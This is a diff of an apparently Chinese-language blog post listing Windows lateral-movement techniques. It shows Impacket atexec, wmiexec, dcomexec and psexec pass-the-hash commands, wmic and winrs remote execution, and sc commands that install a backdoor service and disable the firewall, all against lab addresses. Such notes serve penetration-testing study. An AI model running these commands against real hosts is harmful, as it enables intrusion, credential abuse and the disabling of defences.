@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">891</span>
+            <span class="post-count">1.4k</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">3 min</span>
+            <span class="post-count">6 min</span>
         </span>
     </span>
 </div>
@@ -122,18 +122,68 @@
 
 
 
-<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><ul>
-<li>开放135</li>
+<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><p>windows 2008 以下 at</p>
+<h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><p>windows 2008 及以上 schtasks</p>
+<h3 id="Atexec"><a href="#Atexec" class="headerlink" title="Atexec"></a>Atexec</h3><ul>
+<li>Impacket套件中的Atexec.py  能通过windows计划任务执行远程命令</li>
 </ul>
-<h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><h1 id="windows服务"><a href="#windows服务" class="headerlink" title="windows服务"></a>windows服务</h1><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><p>基于NTML hash认证  (windows认证方式)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 atexec.py -hashes :3c3ec769143bdd0ed99861d0fb79fc6b</span><br><span class="line">shmily.god&#x2F;Administrator@192.168.119.100 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">python3 atexec.py .&#x2F;administrator:admin123...@192.168.119.100 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="ipc-sc"><a href="#ipc-sc" class="headerlink" title="ipc+sc"></a>ipc+sc</h3><p>sc主要用来对操作系统服务进行管理</p>
+<p>建立ipc后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc \\ip  create servername binpath&#x3D; &quot;c:\door.exe&quot; start&#x3D;auto</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line"></span><br><span class="line">sc \ip start servername</span><br></pre></td></tr></table></figure>
+
+<p>​        </p>
+<p>sc通过服务关防火墙 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\ip create unablefirewall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">sc \\ip start unablefirewall</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>前言：</p>
+<p>WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；用户可以使用 WMI 管理本地和远程计算机。</p>
+<p>平时可以用wmic查看进程/安装程序</p>
 <ul>
-<li>impacket</li>
+<li>开放135，没有开防火墙</li>
 </ul>
-<p>atexec.py  直接hash传递进行命令执行，并提权system  （需要免杀）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 atexec.py -hashes :3c3ec769143bdd0ed99861d0fb79fc6b shmily.god&#x2F;Administrator@192.168.119.100 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">python3 atexec.py .&#x2F;administrator:admin123...@192.168.119.100 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+<p>利用：</p>
+<p>ipc+wmic：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">	wmic &#x2F;node:IP &#x2F;user:admin &#x2F;password:123456 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\result.txt&quot;</span><br><span class="line"></span><br><span class="line">	wmic &#x2F;node:192.168.xxx.xxx &#x2F;user:admin &#x2F;password:123456 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\result.txt&quot;</span><br><span class="line"></span><br><span class="line">type \\192.168.xxx.xxx\c$\result.txt</span><br></pre></td></tr></table></figure>
 
 
 
+<p>impacket中的wmiexec.py使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">	python wmiexec.py 用户名:密码@目标IP                                  #获得交互式shell</span><br><span class="line"></span><br><span class="line">python wmiexec.py -hashes LM Hash:NT Hash 域名&#x2F;用户名@目标IP           #hash传递</span><br><span class="line">   </span><br><span class="line">   python wmiexec.py -hashes LM Hash:NT Hash 域名&#x2F;用户名@目标IP &quot;ipconfig&quot; </span><br></pre></td></tr></table></figure>
+
+
+
+<p>还有vbs，powershell方式</p>
+<h1 id="WinRm服务"><a href="#WinRm服务" class="headerlink" title="WinRm服务"></a>WinRm服务</h1><p>前言：</p>
+<p>Windows 远程管理(WinRM)是 WS-Management 协议的 Microsoft 实现，该协议为使用 Web 服务的本地计算机和远程计算机之间的通信提供了一种安全的方式。</p>
+<p>WinRM 默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证，初始身份验证后，WinRM 会话将使用 AES 加密保护。使用 WinRM 服务需要拥有管理员级别的权限。</p>
+<p> WinRM HTTP 通过 TCP 端口 5985 进行通信，启动 WinRM 服务后，防火墙默认会自动放行 5985 端口。</p>
+<p>利用：</p>
+<p>winrs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http:&#x2F;&#x2F;ip:5985 -u:[username] -p:[password] &lt;command&gt;</span><br><span class="line"></span><br><span class="line">winrs -r:http:&#x2F;&#x2F;dc1.god.loal:5985 -u:[username] -p:[password] &lt;command&gt;   #域中指定远程主机机器名</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><p>DCOM（分布式组件对象模型）是微软的一系列概念和程序接口</p>
+<p>Impacket 的dcomexec.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dcomexec.py .&#x2F;Administrator:123456@192.168.119.100</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><p>基于NTML hash认证  (windows认证方式)</p>
 <p>psexec.py </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cd243e1e171da2c4edd1dd695bfbef5a shmily.god&#x2F;Administrator@192.168.119.100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python3 psexec.py shmily.god&#x2F;administrator:admin123...\!@192.168.119.100</span><br></pre></td></tr></table></figure>
 
